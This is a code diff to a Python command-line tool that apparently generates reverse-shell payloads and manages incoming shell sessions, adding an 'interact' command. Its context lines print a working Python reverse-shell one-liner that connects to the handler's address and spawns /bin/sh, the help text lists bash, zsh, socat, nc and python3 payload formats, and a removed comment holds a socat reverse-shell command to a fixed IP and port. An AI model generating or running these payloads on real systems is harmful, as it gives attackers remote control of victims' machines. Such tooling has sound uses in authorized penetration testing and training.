@@ -28,6 +28,7 @@ def print_help(command):
 			print("help\t\t\t\t\tDisplay list of command")
 			print("gen\t\t\t\t\tGenerate payload")
 			print("exit\t\t\t\t\tExit the program")
+			print("interact\t\t\t\t\Interact with session")
 			print("Type 'help \\[command]' to see options for each command.")
 
 	else:
@@ -35,6 +36,10 @@ def print_help(command):
 			print("Usage: gen \\[format]")
 			print("Generates copy-pasteable payload for target. Available formats:")
 			print("- bash\n- zsh\n- socat\n- nc\n- python3")
+		if command[1] == "interact":
+			print("Usage: interact \\[connection_id]")
+			print("Interacts with the target corresponding to given connection ID.")
+			print("If ran without arguments, instead prints current connection IDs.")
 
 def gen_payload(command, ip):
 	if command[1] == "bash":
@@ -48,10 +53,6 @@ def gen_payload(command, ip):
 	if command[1] == "python3":
 		print(f"""[green bold]python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{handler.local_ip}",{handler.port}))[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'[/green bold]""")
 	
-	"""
-	socat TCP:10.10.16.38:4444 EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane gives connection but pretty
-	"""
-
 def list_interacts():
 	print("Listing connection ids...")
 	print(handler.list_conn_ids())
